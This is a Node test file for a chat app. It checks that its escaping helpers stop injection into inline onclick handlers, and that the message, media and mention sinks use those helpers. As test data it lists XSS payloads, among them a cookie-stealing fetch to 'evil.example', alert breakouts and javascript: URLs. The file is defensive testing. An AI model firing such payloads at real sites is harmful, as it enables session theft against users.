/**
 * Inline-handler injection — functional tests.
 *
 * `onclick="fn('${value}')"` is a JS-string-inside-an-HTML-attribute context.
 * escapeHtml() is NOT sufficient there: the browser decodes `&#39;` back to a
 * quote BEFORE the JS parser runs, so a value like
 *
 *     x');fetch('https://evil.example/'+document.cookie)//
 *
 * breaks out of the string and executes. These tests run the REAL jsStr() /
 * safeId() / safeMediaUrl() helpers from app-main.js and assert the value can
 * never terminate the JS string or the attribute, then assert the sensitive
 * sinks actually use them.
 *
 * Run: node tests/xss-inline-handlers.test.js
 */
const fs = require("fs");
const path = require("path");
const vm = require("vm");

const ROOT = path.resolve(__dirname, "..");
const SRC = fs.readFileSync(path.join(ROOT, "app-main.js"), "utf8").replace(/\r\n/g, "\n");

function grab(name) {
  const start = SRC.indexOf("function " + name + "(");
  if (start < 0) throw new Error("function not found: " + name);
  const open = SRC.indexOf("{", start);
  let depth = 0;
  for (let i = open; i < SRC.length; i++) {
    if (SRC[i] === "{") depth++;
    else if (SRC[i] === "}") {
      depth--;
      if (depth === 0) return SRC.slice(start, i + 1);
    }
  }
  throw new Error("unbalanced function: " + name);
}

const sandbox = { console };
vm.createContext(sandbox);
for (const fn of ["jsStr", "safeId", "safeMediaUrl", "escapeHtml"]) {
  vm.runInContext(grab(fn), sandbox);
}
const { jsStr, safeId, safeMediaUrl, escapeHtml } = sandbox;

let pass = 0;
let fail = 0;
const failures = [];
function ok(name, cond) {
  if (cond) { pass++; return; }
  fail++;
  failures.push(name);
  console.log("  ✗ " + name);
}

// The payloads an attacker would actually try.
const PAYLOADS = [
  "x');fetch('https://evil.example/'+document.cookie)//",
  "x\");fetch('https://evil.example')//",
  "');alert(1);('",
  "\\');alert(1)//",
  "</script><img src=x onerror=alert(1)>",
  "\u2028alert(1)\u2029",
  "line1\nline2",
  "back\\slash",
  "quote'and\"double",
];

// ═══════════════════════════════════════════════════════════════════════════
console.log("\n── jsStr: cannot terminate a JS string literal ──");
{
  for (const p of PAYLOADS) {
    const out = jsStr(p);
    ok("no raw single quote in output for " + JSON.stringify(p.slice(0, 22)),
      !/(^|[^\\])'/.test(out));
    ok("no raw double quote in output for " + JSON.stringify(p.slice(0, 22)),
      !/(^|[^\\])"/.test(out));
    ok("no raw < or > for " + JSON.stringify(p.slice(0, 22)), !/[<>]/.test(out));
    ok("no raw newline for " + JSON.stringify(p.slice(0, 22)), !/[\r\n]/.test(out));

    // The real proof: build the handler the app builds, parse it as JS the way
    // the browser would (after HTML attribute decoding), and confirm the value
    // stays a single inert string literal.
    const handler = "fn('" + out + "')";
    let parsed = null;
    try {
      new Function(handler);
      parsed = "ok";
    } catch (e) {
      parsed = e.message;
    }
    ok("handler still parses as one call for " + JSON.stringify(p.slice(0, 22)),
      parsed === "ok");
  }

  ok("jsStr is idempotent enough to not double-escape a normal name",
    jsStr("Ada Lovelace") === "Ada Lovelace");
  ok("jsStr handles null/undefined without throwing",
    jsStr(null) === "" && jsStr(undefined) === "");
}

// ═══════════════════════════════════════════════════════════════════════════
console.log("\n── jsStr: proves escapeHtml alone was NOT safe here ──");
{
  const evil = "x');alert(1)//";
  // escapeHtml output still contains a quote once the browser decodes it.
  const html = escapeHtml(evil);
  const decoded = html.replace(/&#39;/g, "'").replace(/&quot;/g, '"');
  ok("escapeHtml output decodes back to a raw quote (the original bug)",
    decoded.includes("'") || decoded.includes('"'));
  // jsStr survives decoding: the quote stays backslash-escaped.
  const safeDecoded = jsStr(evil).replace(/&amp;/g, "&").replace(/&quot;/g, '"');
  ok("jsStr output decodes to a BACKSLASH-escaped quote",
    /\\'/.test(safeDecoded) && !/(^|[^\\])'/.test(safeDecoded));
}

// ═══════════════════════════════════════════════════════════════════════════
console.log("\n── safeId: doc ids stay in [A-Za-z0-9_-] ──");
{
  for (const p of PAYLOADS) {
    ok("safeId strips handler syntax from " + JSON.stringify(p.slice(0, 22)),
      /^[A-Za-z0-9_-]*$/.test(safeId(p)));
  }
  ok("safeId keeps a real Firestore id intact", safeId("m_1699999999_abc123") === "m_1699999999_abc123");
  ok("safeId keeps a real uid intact",
    safeId("kR3xY9pQ2mZ1aB4cD7eF6gH8iJ0") === "kR3xY9pQ2mZ1aB4cD7eF6gH8iJ0");
  ok("safeId handles null/undefined", safeId(null) === "" && safeId(undefined) === "");
}

// ═══════════════════════════════════════════════════════════════════════════
console.log("\n── safeMediaUrl: only http(s)/blob/data-media ──");
{
  ok("blocks javascript: URLs", safeMediaUrl("javascript:alert(1)") === "");
  ok("blocks data:text/html", safeMediaUrl("data:text/html,<script>alert(1)</script>") === "");
  ok("allows https", safeMediaUrl("https://res.cloudinary.com/x/a.png").startsWith("https://"));
  ok("allows data:image", safeMediaUrl("data:image/png;base64,AAA").startsWith("data:image/"));
  ok("strips quotes from an otherwise-valid URL",
    !/["'`\\]/.test(safeMediaUrl("https://x/a.png';alert(1)//")));
}

// ═══════════════════════════════════════════════════════════════════════════
console.log("\n── the sensitive sinks actually use the safe helpers ──");
{
  // Every one of these previously interpolated a peer-controlled value straight
  // into an inline handler.
  const sinks = [
    ["1:1 image bubble", `onclick="viewImg('\${jsStr(imgUrl)}')"`],
    ["1:1 video bubble", `onclick="viewVideo('\${jsStr(vidUrl)}')"`],
    ["group image bubble", `onclick="viewImg('\${jsStr(imgUrl)}')"`],
    ["group video bubble", `onclick="viewVideo('\${jsStr(vidUrl)}')"`],
    ["channel image post", `onclick="viewImg('\${jsStr(safeMediaUrl(post.image))}')"`],
    ["channel video post", `onclick="viewVideo('\${jsStr(safeMediaUrl(post.video))}')"`],
    ["reaction pill", `toggleReact('\${id}', '\${jsStr(emoji)}')`],
    ["story reply card", `openStoryViewer('\${safeId(msg.storyReplyUid)}', '\${safeId(msg.storyReplyId)}')`],
    ["prompt responses jump", `openPromptResponsesModal('\${jsStr(story.promptId)}')`],
    ["mention row", `insertMention('\${jsStr(name)}', '\${safeId(m.uid)}')`],
    ["channel comment reply", `prepareChannelCommentReply('\${safeId(c.id)}', '\${safeAuthor}', '\${rawText}', '\${safeId(c.authorUid)}')`],
  ];
  for (const [label, needle] of sinks) {
    ok(label + " uses a safe helper", SRC.includes(needle));
  }

  // The context menu builds a dozen handlers from one id; it must sanitize once.
  ok("showCtxMenu sanitizes the id it interpolates",
    /function showCtxMenu\(e, id, msg\) \{[\s\S]{0,300}?id = safeId\(id\);/.test(SRC));
  ok("buildReactionsHTML sanitizes the id it interpolates",
    /function buildReactionsHTML\(id, reactions\) \{[\s\S]{0,220}?id = safeId\(id\);/.test(SRC));

  // Guard against a future edit re-introducing the raw pattern.
  const rawViewImg = (SRC.match(/onclick="viewImg\('\$\{(?!jsStr)/g) || []).length;
  const rawViewVideo = (SRC.match(/onclick="viewVideo\('\$\{(?!jsStr)/g) || []).length;
  ok("no unescaped viewImg( inline handler remains", rawViewImg === 0);
  ok("no unescaped viewVideo( inline handler remains", rawViewVideo === 0);
}

// ═══════════════════════════════════════════════════════════════════════════
console.log("\n─────────────────────────────────────────────");
console.log(`TOTAL: ${pass} passed, ${fail} failed`);
if (fail) {
  console.log("Failed: " + failures.join(", "));
  process.exit(1);
}
